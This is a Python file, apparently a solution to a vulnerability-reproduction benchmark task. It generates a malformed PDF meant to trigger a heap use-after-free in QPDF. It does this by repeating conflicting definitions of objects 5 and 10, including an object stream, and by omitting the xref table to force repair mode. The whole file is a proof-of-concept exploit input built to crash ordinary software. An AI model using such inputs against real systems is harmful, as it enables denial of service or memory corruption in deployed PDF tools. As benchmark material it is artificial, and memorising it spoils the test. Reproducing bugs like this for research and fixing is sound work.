import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in QPDF.
        The vulnerability allows QPDF::getCompressibleObjSet to delete objects from 
        the object cache when there are multiple entries for the same object id.
        """
        out = io.BytesIO()
        
        # PDF Header with binary marker
        out.write(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
        
        # Standard Objects (Catalog, Pages, Page, Empty Stream)
        # 1: Catalog
        out.write(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        # 2: Pages
        out.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        # 3: Page
        out.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n")
        # 4: Content Stream
        out.write(b"4 0 obj\n<< /Length 0 >>\nstream\nendstream\nendobj\n")
        
        # Construct the payload to trigger the UAF
        # We need multiple entries for the same Object ID to confuse the object cache.
        # Specifically, we use an Object Stream (ID 5) that contains Object 10,
        # and also define Object 10 loosely. We also duplicate the stream definition itself.
        
        # Object Stream 5 Data: Defines Object 10 at offset 0
        # "10 0 " is 5 bytes. Object content follows.
        stm_content = b"10 0 (inside_stream)"
        stm_len = str(len(stm_content)).encode()
        
        obj_stm = (
            b"5 0 obj\n"
            b"<< /Type /ObjStm /N 1 /First 5 /Length " + stm_len + b" >>\n"
            b"stream\n" + stm_content + b"\nendstream\nendobj\n"
        )
        
        # Loose definition of Object 10
        loose_10 = b"10 0 obj\n(loose_object)\nendobj\n"
        
        # Loose definition of Object 5 (conflicting with the stream definition)
        loose_5 = b"5 0 obj\n(loose_stream_conflict)\nendobj\n"
        
        # Create a repetitive block of conflicting definitions.
        # Interleaving them maximizes the chance of cache state corruption during repair/linearization.
        block = obj_stm + loose_10 + loose_5 + loose_10 + obj_stm
        
        # Repeat the block sufficient times to ensure cache thrashing
        # 50 iterations * ~300 bytes = ~15KB
        for _ in range(50):
            out.write(block)
            
        # Trailer
        # We omit the XRef table and startxref to force QPDF to perform a linear scan (repair mode),
        # which ensures all duplicate objects are processed and added/removed from the cache.
        out.write(b"trailer\n<< /Root 1 0 R /Size 11 >>\n%%EOF\n")
        
        return out.getvalue()